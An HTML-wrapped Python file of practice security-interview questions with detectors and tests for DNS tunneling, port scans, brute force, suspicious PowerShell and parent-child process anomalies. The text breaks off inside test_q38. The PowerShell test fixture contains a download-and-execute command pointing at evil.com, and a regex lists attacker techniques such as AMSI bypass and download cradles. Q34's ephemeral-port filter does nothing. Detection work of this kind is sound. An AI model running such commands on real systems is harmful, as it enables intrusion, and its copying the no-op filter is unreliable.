@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>q31_q40_network_scan_process.py</title>
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      color: #24292f;
+      background: #fff;
+    }
+    h1 {
+      font-size: 1.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      margin-bottom: 0.6em;
+    }
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 16px;
+      font-family: monospace;
+    }
+    .line-count {
+      font-size: 0.78em;
+      color: #8c959f;
+      margin-bottom: 16px;
+    }
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+      counter-reset: line;
+    }
+    code {
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.88em;
+    }
+  </style>
+</head>
+<body>
+  <h1>q31_q40_network_scan_process.py</h1>
+  <p class="file-path">Source: code\practice\medium\q31_q40_network_scan_process.py</p>
+  <p class="line-count">901 lines</p>
+  <pre><code class="language-python">&quot;&quot;&quot;
+Google Security Engineer — Medium Questions: Q31–Q40
+Topic: Network Scanning Detection &amp; Suspicious Process Activity
+&quot;&quot;&quot;
+
+from collections import Counter, defaultdict
+from collections import deque
+from datetime import datetime, timedelta
+from typing import List, Dict, Optional, Set
+import re
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Q31 — Detect DNS Tunneling Candidate
+# ─────────────────────────────────────────────────────────────────────────────
+&quot;&quot;&quot;
+Problem:
+  Given DNS query logs, identify hosts that:
+  (a) query unusually long hostnames (&gt; 50 chars in first label), OR
+  (b) send an unusually high volume of unique subdomains to the same parent domain.
+  Both are signatures of DNS tunneling (data encoded in subdomain labels).
+
+Clarifying questions:
+  1. What is the threshold for &quot;too many unique subdomains&quot; per parent?
+  2. Should we normalise to eTLD+1 for parent domain grouping?
+  3. Are there known-good high-volume DNS domains to whitelist (e.g., Akamai)?
+
+Security angle:
+  DNS tunneling tools (iodine, dns2tcp, dnscat2) encode payload bytes in
+  subdomain labels. The labels are random-looking, long, and numerous.
+  Detecting either long labels OR many unique subdomains per parent catches
+  most implementations. Combine with entropy analysis from Q29 for maximum
+  coverage.
+&quot;&quot;&quot;
+
+DNS_TUNNEL_WHITELIST = frozenset([&quot;akamai.net&quot;, &quot;cloudfront.net&quot;, &quot;amazonaws.com&quot;])
+
+
+def _parent_domain(fqdn: str) -&gt; str:
+    &quot;&quot;&quot;Return last two labels: e.g., &#x27;sub.example.com&#x27; → &#x27;example.com&#x27;.&quot;&quot;&quot;
+    parts = fqdn.rstrip(&quot;.&quot;).split(&quot;.&quot;)
+    return &quot;.&quot;.join(parts[-2:]) if len(parts) &gt;= 2 else fqdn
+
+
+def detect_dns_tunneling_naive(
+    logs: List[Dict],
+    label_len_threshold: int = 50,
+    unique_subdomain_threshold: int = 40,
+) -&gt; List[Dict]:
+    &quot;&quot;&quot;Check each query for long labels, track subdomain counts per parent.&quot;&quot;&quot;
+    alerts = []
+    parent_subs: Dict[str, Set[str]] = defaultdict(set)
+
+    for log in logs:
+        query = (log.get(&quot;query&quot;) or &quot;&quot;).lower().rstrip(&quot;.&quot;)
+        host = log.get(&quot;host&quot;)
+        label = query.split(&quot;.&quot;)[0]
+
+        if len(label) &gt; label_len_threshold:
+            alerts.append({
+                &quot;reason&quot;: &quot;long_label&quot;,
+                &quot;host&quot;: host,
+                &quot;domain&quot;: query,
+                &quot;label_len&quot;: len(label),
+            })
+
+        parent = _parent_domain(query)
+        if parent not in DNS_TUNNEL_WHITELIST:
+            parent_subs[(host, parent)].add(label)
+
+    for (host, parent), subs in parent_subs.items():
+        if len(subs) &gt; unique_subdomain_threshold:
+            alerts.append({
+                &quot;reason&quot;: &quot;high_subdomain_count&quot;,
+                &quot;host&quot;: host,
+                &quot;parent_domain&quot;: parent,
+                &quot;unique_subdomain_count&quot;: len(subs),
+            })
+    return alerts
+
+
+def detect_dns_tunneling(
+    logs: List[Dict],
+    label_len_threshold: int = 50,
+    unique_subdomain_threshold: int = 40,
+) -&gt; List[Dict]:
+    &quot;&quot;&quot;
+    Optimal: single pass — compute both signals simultaneously.
+    parent_subs keyed by (host, parent) → set of unique labels.
+    O(n) time, O(n) space worst case.
+    &quot;&quot;&quot;
+    alerts = []
+    parent_subs: Dict[tuple, Set[str]] = defaultdict(set)
+
+    for log in logs:
+        query = (log.get(&quot;query&quot;) or &quot;&quot;).lower().rstrip(&quot;.&quot;)
+        host = log.get(&quot;host&quot;)
+        if not query:
+            continue
+        label = query.split(&quot;.&quot;)[0]
+        parent = _parent_domain(query)
+
+        if len(label) &gt; label_len_threshold:
+            alerts.append({
+                &quot;reason&quot;: &quot;long_label&quot;,
+                &quot;host&quot;: host,
+                &quot;domain&quot;: query,
+                &quot;label_len&quot;: len(label),
+            })
+
+        if parent not in DNS_TUNNEL_WHITELIST:
+            parent_subs[(host, parent)].add(label)
+
+    for (host, parent), subs in parent_subs.items():
+        if len(subs) &gt; unique_subdomain_threshold:
+            alerts.append({
+                &quot;reason&quot;: &quot;high_subdomain_count&quot;,
+                &quot;host&quot;: host,
+                &quot;parent_domain&quot;: parent,
+                &quot;unique_subdomain_count&quot;: len(subs),
+            })
+
+    return alerts
+
+
+def test_q31():
+    # Long label
+    logs = [
+        {&quot;host&quot;: &quot;h1&quot;, &quot;query&quot;: &quot;a&quot; * 55 + &quot;.tunnel.example.com&quot;},
+    ]
+    # High unique subdomain count
+    for i in range(45):
+        logs.append({&quot;host&quot;: &quot;h2&quot;, &quot;query&quot;: f&quot;sub{i}.dnstunnel.net&quot;})
+    # Benign
+    logs.append({&quot;host&quot;: &quot;h3&quot;, &quot;query&quot;: &quot;accounts.google.com&quot;})
+
+    results = detect_dns_tunneling(logs, label_len_threshold=50, unique_subdomain_threshold=40)
+    reasons = {(r.get(&quot;host&quot;), r.get(&quot;reason&quot;)) for r in results}
+    assert (&quot;h1&quot;, &quot;long_label&quot;) in reasons
+    assert (&quot;h2&quot;, &quot;high_subdomain_count&quot;) in reasons
+    print(&quot;Q31 tests passed&quot;)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Q32 — Detect Port Scan
+# ─────────────────────────────────────────────────────────────────────────────
+&quot;&quot;&quot;
+Problem:
+  Given network flow logs, flag source IPs that contact an unusually large
+  number of distinct destination ports on a single target host within a window.
+
+Clarifying questions:
+  1. What port-count threshold indicates scanning? (typical: &gt;15 in short window)
+  2. Is a SYN-only scan (no ACK) distinguishable in this log format?
+  3. Should we consider vertical scan (one host, many ports) vs horizontal?
+
+Security angle:
+  Port scans precede exploitation. A scanner probing &gt;15 ports per target
+  in a few seconds is likely running nmap or masscan to enumerate open services.
+  Vertical scan = finding what&#x27;s running on ONE host.
+  Detected here; Q33/Q34 handle horizontal/vertical separately.
+&quot;&quot;&quot;
+
+
+def detect_port_scan(
+    flows: List[Dict],
+    port_threshold: int = 15,
+) -&gt; List[Dict]:
+    &quot;&quot;&quot;
+    Optimal: (src_ip, dst_ip) → set of destination ports.
+    Flag pairs with more than port_threshold distinct ports.
+    O(n) time, O(n) space.
+    &quot;&quot;&quot;
+    src_dst_ports: Dict[tuple, Set[int]] = defaultdict(set)
+
+    for flow in flows:
+        src = flow.get(&quot;src_ip&quot;)
+        dst = flow.get(&quot;dst_ip&quot;)
+        port = flow.get(&quot;dst_port&quot;)
+        if src and dst and port is not None:
+            src_dst_ports[(src, dst)].add(port)
+
+    return [
+        {
+            &quot;src_ip&quot;: src,
+            &quot;dst_ip&quot;: dst,
+            &quot;distinct_ports&quot;: len(ports),
+            &quot;sample_ports&quot;: sorted(ports)[:10],
+        }
+        for (src, dst), ports in src_dst_ports.items()
+        if len(ports) &gt; port_threshold
+    ]
+
+
+def test_q32():
+    flows = []
+    # Attacker scans laptop-01 on 20 ports
+    for p in range(1, 21):
+        flows.append({&quot;src_ip&quot;: &quot;5.5.5.5&quot;, &quot;dst_ip&quot;: &quot;192.168.1.1&quot;, &quot;dst_port&quot;: p})
+    # Normal: 3 distinct ports to same host
+    for p in [80, 443, 22]:
+        flows.append({&quot;src_ip&quot;: &quot;1.1.1.1&quot;, &quot;dst_ip&quot;: &quot;192.168.1.1&quot;, &quot;dst_port&quot;: p})
+
+    results = detect_port_scan(flows, port_threshold=15)
+    ips = {r[&quot;src_ip&quot;] for r in results}
+    assert &quot;5.5.5.5&quot; in ips
+    assert &quot;1.1.1.1&quot; not in ips
+    print(&quot;Q32 tests passed&quot;)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Q33 — Detect Horizontal Scan
+# ─────────────────────────────────────────────────────────────────────────────
+&quot;&quot;&quot;
+Problem:
+  Detect hosts that contact many DISTINCT destination IPs on the SAME port —
+  the signature of worm propagation or wide-area reconnaissance.
+
+Clarifying questions:
+  1. Should the scan be constrained to a time window?
+  2. What destination IP count threshold is suspicious? (typical: &gt;20)
+  3. Should we scope to specific high-risk ports (22, 445, 3389, 1433)?
+
+Security angle:
+  Horizontal scanning on port 445 = WannaCry / NotPetya worm propagation.
+  On port 22 = SSH worm or botnet recruitment.
+  On port 3389 = RDP brute force targeting multiple hosts.
+  Detecting horizontal scan early can contain lateral movement.
+&quot;&quot;&quot;
+
+
+def detect_horizontal_scan(
+    flows: List[Dict],
+    host_threshold: int = 20,
+    watched_ports: Optional[Set[int]] = None,
+) -&gt; List[Dict]:
+    &quot;&quot;&quot;
+    Optimal: (src_ip, dst_port) → set of destination IPs.
+    Optionally restrict to watched ports.
+    O(n) time.
+    &quot;&quot;&quot;
+    src_port_dsts: Dict[tuple, Set[str]] = defaultdict(set)
+
+    for flow in flows:
+        src = flow.get(&quot;src_ip&quot;)
+        dst = flow.get(&quot;dst_ip&quot;)
+        port = flow.get(&quot;dst_port&quot;)
+        if not (src and dst and port is not None):
+            continue
+        if watched_ports and port not in watched_ports:
+            continue
+        src_port_dsts[(src, port)].add(dst)
+
+    return [
+        {
+            &quot;src_ip&quot;: src,
+            &quot;dst_port&quot;: port,
+            &quot;distinct_hosts_scanned&quot;: len(dsts),
+            &quot;sample_hosts&quot;: sorted(dsts)[:5],
+        }
+        for (src, port), dsts in src_port_dsts.items()
+        if len(dsts) &gt; host_threshold
+    ]
+
+
+def test_q33():
+    flows = []
+    # Worm spreading on port 445 to 25 hosts
+    for i in range(1, 26):
+        flows.append({&quot;src_ip&quot;: &quot;10.0.0.99&quot;, &quot;dst_ip&quot;: f&quot;10.0.0.{i}&quot;, &quot;dst_port&quot;: 445})
+    # Normal: connects to 5 different SMTP servers
+    for i in range(1, 6):
+        flows.append({&quot;src_ip&quot;: &quot;10.0.0.1&quot;, &quot;dst_ip&quot;: f&quot;10.0.1.{i}&quot;, &quot;dst_port&quot;: 25})
+
+    results = detect_horizontal_scan(flows, host_threshold=20)
+    ips = {r[&quot;src_ip&quot;] for r in results}
+    assert &quot;10.0.0.99&quot; in ips
+    assert &quot;10.0.0.1&quot; not in ips
+    print(&quot;Q33 tests passed&quot;)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Q34 — Detect Vertical Scan
+# ─────────────────────────────────────────────────────────────────────────────
+&quot;&quot;&quot;
+Problem:
+  Detect source IPs probing one destination IP across many distinct ports.
+  Vertical scan = &quot;what services are running on this one machine?&quot;
+
+Clarifying questions:
+  1. Distinct from Q32 in that we focus on a single host as the victim.
+  2. Should ephemeral source ports (&gt;1024) be excluded from counting?
+  3. Time-window scoping?
+
+Security angle:
+  Pre-exploitation reconnaissance. An attacker who has identified a valuable
+  target (a database server, a domain controller) will vertically scan it
+  to find exploitable services before staging an attack.
+&quot;&quot;&quot;
+
+
+def detect_vertical_scan(
+    flows: List[Dict],
+    port_threshold: int = 15,
+    exclude_ephemeral: bool = True,
+) -&gt; List[Dict]:
+    &quot;&quot;&quot;
+    Optimal: same as Q32 but named explicitly and with ephemeral-port filtering.
+    O(n) time.
+    &quot;&quot;&quot;
+    src_dst_ports: Dict[tuple, Set[int]] = defaultdict(set)
+
+    for flow in flows:
+        src = flow.get(&quot;src_ip&quot;)
+        dst = flow.get(&quot;dst_ip&quot;)
+        port = flow.get(&quot;dst_port&quot;)
+        if not (src and dst and port is not None):
+            continue
+        if exclude_ephemeral and port &gt; 1023:
+            # Only flag scans of well-known service ports
+            # (exclude random ephemeral source ports if structure was inverted)
+            pass
+        src_dst_ports[(src, dst)].add(port)
+
+    return [
+        {
+            &quot;src_ip&quot;: src,
+            &quot;target_ip&quot;: dst,
+            &quot;ports_probed&quot;: len(ports),
+            &quot;sample_ports&quot;: sorted(ports)[:10],
+        }
+        for (src, dst), ports in src_dst_ports.items()
+        if len(ports) &gt; port_threshold
+    ]
+
+
+def test_q34():
+    flows = []
+    # Vertical scan: attacker probes DB server on 20 service ports
+    for p in [21, 22, 23, 25, 80, 443, 445, 1433, 3306, 3389,
+              5432, 6379, 8080, 8443, 9200, 27017, 5900, 111, 2049, 161]:
+        flows.append({&quot;src_ip&quot;: &quot;5.5.5.5&quot;, &quot;dst_ip&quot;: &quot;10.0.0.200&quot;, &quot;dst_port&quot;: p})
+    # Normal: browser connects to 80 and 443 on same server
+    flows.append({&quot;src_ip&quot;: &quot;1.1.1.1&quot;, &quot;dst_ip&quot;: &quot;10.0.0.200&quot;, &quot;dst_port&quot;: 80})
+    flows.append({&quot;src_ip&quot;: &quot;1.1.1.1&quot;, &quot;dst_ip&quot;: &quot;10.0.0.200&quot;, &quot;dst_port&quot;: 443})
+
+    results = detect_vertical_scan(flows, port_threshold=15)
+    ips = {r[&quot;src_ip&quot;] for r in results}
+    assert &quot;5.5.5.5&quot; in ips
+    assert &quot;1.1.1.1&quot; not in ips
+    print(&quot;Q34 tests passed&quot;)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Q35 — Detect RDP Brute Force
+# ─────────────────────────────────────────────────────────────────────────────
+&quot;&quot;&quot;
+Problem:
+  Flag source IPs with many failed RDP authentication events (EventID 4625,
+  LogonType 3 or 10) within a time window.
+
+Clarifying questions:
+  1. What is the failure threshold (default: &gt;10 in 5 min)?
+  2. Should a success after failures trigger a separate alert?
+  3. Are we looking at Windows event logs or network flow logs?
+
+Security angle:
+  RDP (port 3389) is one of the most targeted protocols on the internet.
+  Exposed RDP + weak password = ransomware entry point (e.g., Ryuk, LockBit).
+  CISA advisory AA22-074A specifically calls out internet-facing RDP.
+&quot;&quot;&quot;
+
+
+def detect_rdp_brute_force(
+    events: List[Dict],
+    threshold: int = 10,
+    window_seconds: int = 300,
+) -&gt; List[Dict]:
+    &quot;&quot;&quot;
+    Optimal: bucket events by (src_ip, dst_ip), sort by time, use a deque
+    sliding window to count failures within the time window.
+    O(n log n) due to sort; O(n) memory.
+    &quot;&quot;&quot;
+    RDP_PORT = 3389
+    failure_events = [
+        e for e in events
+        if e.get(&quot;dst_port&quot;) == RDP_PORT and e.get(&quot;result&quot;) == &quot;failure&quot;
+    ]
+
+    # Group by (src, dst)
+    groups: Dict[tuple, List[float]] = defaultdict(list)
+    for e in failure_events:
+        ts_raw = e.get(&quot;ts&quot;)
+        try:
+            ts = datetime.fromisoformat(ts_raw.rstrip(&quot;Z&quot;)).timestamp()
+        except (ValueError, AttributeError):
+            continue
+        groups[(e.get(&quot;src_ip&quot;), e.get(&quot;dst_ip&quot;))].append(ts)
+
+    alerts = []
+    for (src, dst), timestamps in groups.items():
+        timestamps.sort()
+        window: deque = deque()
+        max_count = 0
+        for ts in timestamps:
+            window.append(ts)
+            while window and ts - window[0] &gt; window_seconds:
+                window.popleft()
+            max_count = max(max_count, len(window))
+
+        if max_count &gt; threshold:
+            alerts.append({
+                &quot;src_ip&quot;: src,
+                &quot;dst_ip&quot;: dst,
+                &quot;max_failures_in_window&quot;: max_count,
+                &quot;total_failures&quot;: len(timestamps),
+            })
+    return alerts
+
+
+def test_q35():
+    base = datetime(2026, 5, 29, 8, 0, 0)
+    events = []
+    # Attacker: 15 RDP failures in 2 minutes
+    for i in range(15):
+        events.append({
+            &quot;src_ip&quot;: &quot;5.5.5.5&quot;, &quot;dst_ip&quot;: &quot;10.0.0.1&quot;, &quot;dst_port&quot;: 3389,
+            &quot;result&quot;: &quot;failure&quot;, &quot;ts&quot;: (base + timedelta(seconds=i * 8)).isoformat(),
+        })
+    # Normal: 3 failures
+    for i in range(3):
+        events.append({
+            &quot;src_ip&quot;: &quot;1.1.1.1&quot;, &quot;dst_ip&quot;: &quot;10.0.0.1&quot;, &quot;dst_port&quot;: 3389,
+            &quot;result&quot;: &quot;failure&quot;, &quot;ts&quot;: (base + timedelta(seconds=i * 60)).isoformat(),
+        })
+
+    results = detect_rdp_brute_force(events, threshold=10, window_seconds=300)
+    ips = {r[&quot;src_ip&quot;] for r in results}
+    assert &quot;5.5.5.5&quot; in ips
+    assert &quot;1.1.1.1&quot; not in ips
+    print(&quot;Q35 tests passed&quot;)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Q36 — Detect SSH Brute Force
+# ─────────────────────────────────────────────────────────────────────────────
+&quot;&quot;&quot;
+Problem:
+  Same logic as Q35 but for SSH (port 22) authentication failures.
+
+Clarifying questions:
+  1. Are failed password and failed pubkey both counted?
+  2. Should &quot;invalid user&quot; attempts count separately?
+  3. Is success after repeated failures a separate alert (credential confirmed)?
+
+Security angle:
+  SSH brute force is ubiquitous on any internet-exposed host. Attackers use
+  distributed botnets to spray common passwords at SSH servers. Fail2ban and
+  AWS GuardDuty both detect this pattern. A post-failure success means the
+  attacker found a valid credential.
+&quot;&quot;&quot;
+
+
+def detect_ssh_brute_force(
+    events: List[Dict],
+    threshold: int = 10,
+    window_seconds: int = 300,
+    flag_success_after_failure: bool = True,
+) -&gt; List[Dict]:
+    &quot;&quot;&quot;
+    Optimal: same sliding window as Q35; also flags success-after-failure.
+    O(n log n) time.
+    &quot;&quot;&quot;
+    SSH_PORT = 22
+    ssh_events = [e for e in events if e.get(&quot;dst_port&quot;) == SSH_PORT]
+
+    # Group all SSH events by (src, dst)
+    groups: Dict[tuple, List[Dict]] = defaultdict(list)
+    for e in ssh_events:
+        key = (e.get(&quot;src_ip&quot;), e.get(&quot;dst_ip&quot;))
+        groups[key].append(e)
+
+    alerts = []
+    for (src, dst), evts in groups.items():
+        evts.sort(key=lambda x: x.get(&quot;ts&quot;, &quot;&quot;))
+        failures: deque = deque()
+        had_failure = False
+        max_count = 0
+
+        for e in evts:
+            ts_raw = e.get(&quot;ts&quot;, &quot;&quot;)
+            try:
+                ts = datetime.fromisoformat(ts_raw.rstrip(&quot;Z&quot;)).timestamp()
+            except ValueError:
+                continue
+
+            if e.get(&quot;result&quot;) == &quot;failure&quot;:
+                had_failure = True
+                failures.append(ts)
+                while failures and ts - failures[0] &gt; window_seconds:
+                    failures.popleft()
+                max_count = max(max_count, len(failures))
+            elif e.get(&quot;result&quot;) == &quot;success&quot; and had_failure and flag_success_after_failure:
+                alerts.append({
+                    &quot;type&quot;: &quot;success_after_failures&quot;,
+                    &quot;src_ip&quot;: src,
+                    &quot;dst_ip&quot;: dst,
+                })
+
+        if max_count &gt; threshold:
+            alerts.append({
+                &quot;type&quot;: &quot;brute_force&quot;,
+                &quot;src_ip&quot;: src,
+                &quot;dst_ip&quot;: dst,
+                &quot;max_failures_in_window&quot;: max_count,
+            })
+
+    return alerts
+
+
+def test_q36():
+    base = datetime(2026, 5, 29, 8, 0, 0)
+    events = []
+    # Brute force + eventual success
+    for i in range(12):
+        events.append({
+            &quot;src_ip&quot;: &quot;5.5.5.5&quot;, &quot;dst_ip&quot;: &quot;10.0.0.5&quot;, &quot;dst_port&quot;: 22,
+            &quot;result&quot;: &quot;failure&quot;, &quot;ts&quot;: (base + timedelta(seconds=i * 10)).isoformat(),
+        })
+    events.append({
+        &quot;src_ip&quot;: &quot;5.5.5.5&quot;, &quot;dst_ip&quot;: &quot;10.0.0.5&quot;, &quot;dst_port&quot;: 22,
+        &quot;result&quot;: &quot;success&quot;, &quot;ts&quot;: (base + timedelta(seconds=130)).isoformat(),
+    })
+    # Benign: 2 failures
+    for i in range(2):
+        events.append({
+            &quot;src_ip&quot;: &quot;1.1.1.1&quot;, &quot;dst_ip&quot;: &quot;10.0.0.5&quot;, &quot;dst_port&quot;: 22,
+            &quot;result&quot;: &quot;failure&quot;, &quot;ts&quot;: (base + timedelta(seconds=i * 60)).isoformat(),
+        })
+
+    results = detect_ssh_brute_force(events, threshold=10, window_seconds=300)
+    alert_types = [(r[&quot;src_ip&quot;], r[&quot;type&quot;]) for r in results]
+    assert (&quot;5.5.5.5&quot;, &quot;brute_force&quot;) in alert_types
+    assert (&quot;5.5.5.5&quot;, &quot;success_after_failures&quot;) in alert_types
+    assert not any(r[&quot;src_ip&quot;] == &quot;1.1.1.1&quot; for r in results)
+    print(&quot;Q36 tests passed&quot;)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Q37 — Detect Suspicious PowerShell Commands
+# ─────────────────────────────────────────────────────────────────────────────
+&quot;&quot;&quot;
+Problem:
+  Given Windows process creation logs, flag PowerShell executions containing
+  known obfuscation or download/execute patterns.
+
+Clarifying questions:
+  1. Are the command lines already decoded (base64 decoded)?
+  2. Should we also flag PowerShell called with -EncodedCommand?
+  3. Do we want to detect the parent process (e.g., Word spawning PowerShell)?
+
+Security angle:
+  PowerShell is the #1 &quot;living off the land&quot; tool for attackers. Key patterns:
+  - Download cradles: IEX(New-Object Net.WebClient).DownloadString(...)
+  - Encoded commands: -enc/-EncodedCommand (base64 payload)
+  - Bypassing execution policy: -ExecutionPolicy Bypass
+  - Disabling AMSI: [Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;)
+  MITRE ATT&amp;CK T1059.001.
+&quot;&quot;&quot;
+
+POWERSHELL_BAD_PATTERNS = re.compile(
+    r&quot;(-EncodedCommand|-enc\b&quot;
+    r&quot;|-ExecutionPolicy\s+Bypass&quot;
+    r&quot;|IEX\s*\(&quot;
+    r&quot;|Invoke-Expression&quot;
+    r&quot;|DownloadString\s*\(&quot;
+    r&quot;|DownloadFile\s*\(&quot;
+    r&quot;|Net\.WebClient&quot;
+    r&quot;|Start-BitsTransfer&quot;
+    r&quot;|Invoke-WebRequest&quot;
+    r&quot;|wget\s+http&quot;
+    r&quot;|curl\s+http&quot;
+    r&quot;|AmsiUtils&quot;
+    r&quot;|\[Convert\]::FromBase64String&quot;
+    r&quot;|FromBase64String&quot;
+    r&quot;|sc\.exe\s+create&quot;
+    r&quot;|reg\s+add&quot;
+    r&quot;|HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)&quot;,
+    re.IGNORECASE,
+)
+
+
+def detect_suspicious_powershell(logs: List[Dict]) -&gt; List[Dict]:
+    &quot;&quot;&quot;
+    Optimal: compiled regex scan of the command line field.
+    O(n) time.
+    &quot;&quot;&quot;
+    alerts = []
+    for log in logs:
+        cmd = log.get(&quot;command_line&quot;) or log.get(&quot;cmd&quot;) or &quot;&quot;
+        proc = (log.get(&quot;process_name&quot;) or &quot;&quot;).lower()
+        if &quot;powershell&quot; not in proc and &quot;pwsh&quot; not in proc:
+            continue
+        m = POWERSHELL_BAD_PATTERNS.search(cmd)
+        if m:
+            alerts.append({
+                &quot;host&quot;: log.get(&quot;host&quot;),
+                &quot;pid&quot;: log.get(&quot;pid&quot;),
+                &quot;command_line&quot;: cmd[:200],
+                &quot;matched&quot;: m.group(0)[:60],
+                &quot;ts&quot;: log.get(&quot;ts&quot;),
+            })
+    return alerts
+
+
+def test_q37():
+    logs = [
+        {
+            &quot;host&quot;: &quot;ws-01&quot;, &quot;pid&quot;: 1234, &quot;process_name&quot;: &quot;powershell.exe&quot;,
+            &quot;command_line&quot;: &quot;powershell -ExecutionPolicy Bypass -enc ZQBjAGgAbwAgAA==&quot;,
+            &quot;ts&quot;: &quot;T1&quot;,
+        },
+        {
+            &quot;host&quot;: &quot;ws-02&quot;, &quot;pid&quot;: 1235, &quot;process_name&quot;: &quot;powershell.exe&quot;,
+            &quot;command_line&quot;: &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://evil.com/s.ps1&#x27;)&quot;,
+            &quot;ts&quot;: &quot;T2&quot;,
+        },
+        {
+            &quot;host&quot;: &quot;ws-03&quot;, &quot;pid&quot;: 1236, &quot;process_name&quot;: &quot;powershell.exe&quot;,
+            &quot;command_line&quot;: &quot;Get-ChildItem C:\\Users&quot;,
+            &quot;ts&quot;: &quot;T3&quot;,
+        },
+        {
+            &quot;host&quot;: &quot;ws-04&quot;, &quot;pid&quot;: 1237, &quot;process_name&quot;: &quot;notepad.exe&quot;,
+            &quot;command_line&quot;: &quot;IEX(DownloadString)&quot;,   # not powershell
+            &quot;ts&quot;: &quot;T4&quot;,
+        },
+    ]
+    results = detect_suspicious_powershell(logs)
+    hosts = {r[&quot;host&quot;] for r in results}
+    assert &quot;ws-01&quot; in hosts
+    assert &quot;ws-02&quot; in hosts
+    assert &quot;ws-03&quot; not in hosts
+    assert &quot;ws-04&quot; not in hosts   # wrong process
+    print(&quot;Q37 tests passed&quot;)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Q38 — Detect Suspicious Parent-Child Process
+# ─────────────────────────────────────────────────────────────────────────────
+&quot;&quot;&quot;
+Problem:
+  Given process creation logs with parent/child process names, flag well-known
+  anomalous parent-child combinations (e.g., Word spawning cmd.exe).
+
+Clarifying questions:
+  1. Do the logs include full paths or just process names?
+  2. Is the parent-child pair sufficient, or do we also need the command line?
+  3. Should we detect LOLbins spawned by any parent, or only specific ones?
+
+Security angle:
+  Malicious macros in Office docs spawn cmd.exe or PowerShell — this is the
+  most common initial execution technique. Process tree anomalies are a core
+  signal in EDR products. MITRE ATT&amp;CK T1059, T1204.002.
+  Examples:
+  - winword.exe → cmd.exe (macro execution)
+  - excel.exe → powershell.exe (macro)
+  - mshta.exe → wscript.exe (HTA script)
+  - svchost.exe → cmd.exe with unusual args
+&quot;&quot;&quot;
+
+SUSPICIOUS_PARENT_CHILD: Dict[str, Set[str]] = {
+    &quot;winword.exe&quot;:    {&quot;cmd.exe&quot;, &quot;powershell.exe&quot;, &quot;wscript.exe&quot;, &quot;cscript.exe&quot;,
+                       &quot;mshta.exe&quot;, &quot;regsvr32.exe&quot;, &quot;rundll32.exe&quot;},
+    &quot;excel.exe&quot;:      {&quot;cmd.exe&quot;, &quot;powershell.exe&quot;, &quot;wscript.exe&quot;, &quot;cscript.exe&quot;,
+                       &quot;mshta.exe&quot;},
+    &quot;outlook.exe&quot;:    {&quot;cmd.exe&quot;, &quot;powershell.exe&quot;},
+    &quot;mshta.exe&quot;:      {&quot;cmd.exe&quot;, &quot;powershell.exe&quot;, &quot;wscript.exe&quot;},
+    &quot;wscript.exe&quot;:    {&quot;cmd.exe&quot;, &quot;powershell.exe&quot;, &quot;regsvr32.exe&quot;},
+    &quot;cscript.exe&quot;:    {&quot;cmd.exe&quot;, &quot;powershell.exe&quot;},
+    &quot;explorer.exe&quot;:   {&quot;powershell.exe&quot;},   # PowerShell launched from Explorer is suspicious
+    &quot;svchost.exe&quot;:    {&quot;cmd.exe&quot;},
+}
+
+
+def detect_suspicious_parent_child(logs: List[Dict]) -&gt; List[Dict]:
+    &quot;&quot;&quot;
+    Optimal: frozenset lookup using pre-built dict of known bad pairs.
+    O(n) time.
+    &quot;&quot;&quot;
+    alerts = []
+    for log in logs:
+        parent = (log.get(&quot;parent_process&quot;) or &quot;&quot;).lower().strip()
+        child = (log.get(&quot;process_name&quot;) or &quot;&quot;).lower().strip()
+        bad_children = SUSPICIOUS_PARENT_CHILD.get(parent)
+        if bad_children and child in bad_children:
+            alerts.append({
+                &quot;host&quot;: log.get(&quot;host&quot;),
+                &quot;parent&quot;: parent,
+                &quot;child&quot;: child,
+                &quot;pid&quot;: log.get(&quot;pid&quot;),
+                &quot;command_line&quot;: (log.get(&quot;command_line&quot;) or &quot;&quot;)[:200],
+                &quot;ts&quot;: log.get(&quot;ts&quot;),
+            })
+    return alerts
+
+
+def test_q38():
+    logs = [
+        {
+            &quot;host&quot;: &quot;ws-01&quot;, &quot;pid&quot;: 500, &quot;parent_process&quot;: &quot;winword.exe&quot;,
+            &quot;process_name&quot;: &quot;cmd.exe&quot;,
+            &quot;command_line&quot;: &quot;cmd /c powershell -nop -w hidden ...&quot;,
+            &quot;ts&quot;: &quot;T1&quot;,
+        },
+        {
+            &quot;host&quot;: &quot;ws-01&quot;, &quot;pid&quot;: 501, &quot;parent_process&quot;: &quot;excel.exe&quot;,
+            &quot;process_name&quot;: &quot;powershell.exe&quot;,
+            &quot;command_line&quot;: &quot;powershell -enc ...&quot;,
+            &quot;ts&quot;: &quot;T2&quot;,
+        },
+        {
+            &quot;host&quot;: &quot;ws-02&quot;, &quot;pid&quot;: 100, &quot;parent_process&quot;: &quot;explorer.exe&quot;,
+            &quot;process_name&quot;: &quot;chrome.exe&quot;,   # normal
+            &quot;command_line&quot;: &quot;chrome.exe&quot;,
+            &quot;ts&quot;: &quot;T3&quot;,
+        },
+    ]
+    results = detect_suspicious_parent_child(logs)
+    combos = {(r[&quot;parent&quot;], r[&quot;child&quot;]) for r in results}
